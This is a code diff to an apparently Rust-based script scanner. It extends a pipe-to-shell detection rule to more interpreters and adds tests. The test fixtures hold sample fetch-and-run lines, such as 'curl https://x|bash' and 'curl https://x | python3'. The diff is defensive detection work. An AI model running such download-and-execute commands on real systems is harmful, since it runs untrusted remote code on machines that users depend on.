@@ -1822,10 +1822,13 @@ fn line_matches_pipe_to_shell(line: &str) -> bool {
     if !fetcher {
         return false;
     }
-    let shell_hits = ["bash", "sh", "dash", "zsh", "fish"].iter().any(|shell| {
-        right
-            .split_whitespace()
-            .any(|word| word.trim_matches(';') == *shell)
+    let interpreters = [
+        "bash", "sh", "dash", "zsh", "fish", "python", "python3", "perl", "ruby", "php",
+    ];
+    let shell_hits = interpreters.iter().any(|shell| {
+        right.split_whitespace().any(|word| {
+            word.trim_matches(['|', '&', ';', '"', '\'', '(', ')', ',', '`', '{', '}']) == *shell
+        })
     });
     fetcher && shell_hits
 }
@@ -2555,6 +2558,14 @@ mod tests {
     #[test]
     fn r13_catches_folded_fetcher() {
         let findings = findings_for("_c=curl\nbuild() {\n $_c https://x | sh\n}\n");
+        assert!(has_rule(&findings, "R13_PIPE_TO_SHELL"));
+    }
+
+    #[test]
+    fn r13_catches_spaceless_pipe_and_script_interpreters() {
+        let findings = findings_for("build() {\n curl https://x|bash\n}\n");
+        assert!(has_rule(&findings, "R13_PIPE_TO_SHELL"));
+        let findings = findings_for("build() {\n curl https://x | python3\n}\n");
         assert!(has_rule(&findings, "R13_PIPE_TO_SHELL"));
     }
 
